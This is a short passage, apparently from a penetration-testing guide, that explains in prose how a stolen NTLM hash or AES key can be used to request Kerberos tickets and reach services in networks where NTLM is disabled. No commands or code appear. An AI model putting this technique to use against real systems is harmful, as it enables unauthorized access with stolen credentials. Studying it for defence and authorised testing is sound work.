Microsoft Kerberos - Sorry you guys don't get it}

This attack aims to use the user NTLM hash or AES keys to request Kerberos
tickets, as an alternative to the common Pass The Hash over NTLM protocol.
Therefore, this could be especially useful in networks where NTLM protocol is
disabled and only Kerberos is allowed as authentication protocol.

In order to perform this attack, the NTLM hash (or password) of the target user
account is needed. Thus, once a user hash is obtained, a TGT can be requested
for that account. Finally, it is possible to access any service or machine
where the user account has permissions.
